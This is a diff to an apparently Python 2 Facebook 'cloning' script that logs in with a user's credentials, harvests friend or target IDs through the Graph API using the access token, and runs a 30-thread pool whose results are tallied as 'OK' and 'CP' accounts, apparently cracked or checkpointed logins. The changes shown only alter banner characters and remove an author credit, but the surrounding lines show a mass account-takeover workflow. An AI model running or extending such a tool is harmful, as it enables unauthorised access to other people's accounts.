@@ -78,7 +78,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print('	   \033[1;95m【\x1b[1;95mLOGIN WITH FACEBOOK\x1b[1;95m】' )
+		print('	   \033[1;95m\x1b[1;95mLOGIN WITH FACEBOOK\x1b[1;95m' )
 		print('	' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
@@ -199,7 +199,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		print "\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
 		jalan('\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -209,7 +209,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		print "\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -234,7 +234,7 @@ def pilih_super():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	print "\n\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
 	
 			
 	def main(arg):
@@ -353,8 +353,7 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "  \033[1;91m«---------Developed By Omi------------»"
+	print "\033[1;97m\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
